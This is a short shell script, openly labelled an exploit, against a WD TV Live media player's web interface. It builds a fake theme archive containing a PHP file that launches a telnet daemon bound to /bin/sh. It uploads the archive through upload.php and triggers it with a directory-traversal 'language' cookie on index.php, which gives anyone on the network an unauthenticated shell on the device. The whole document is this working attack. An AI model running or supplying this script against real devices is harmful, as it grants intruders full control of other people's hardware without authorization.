#!/bin/sh
THEME_NAME="blub"
 
if [ $# != 1 ]; then
  TARGET="WDTVLive"
else
  TARGET=$1
fi
 
if [ ! -f "home.php" ]; then
  echo '<?php system("telnetd -l /bin/sh");print "\ntelnet daemon launched!.\n\n";exit();' > home.php
fi
 
if [ ! -f "${THEME_NAME}.zip" ]; then
  touch meta.xml
  zip ${THEME_NAME} home.php meta.xml
fi
 
curl -F "appearance=@${THEME_NAME}.zip" -o /dev/null http://${TARGET}/upload.php
curl --cookie "language=../../../../usrdata/.wd_tv/theme/${THEME_NAME}" http://${TARGET}/index.php

rm home.php
rm meta.xml
rm ${THEME_NAME}.zip

echo "WDTVLive exploit installed!"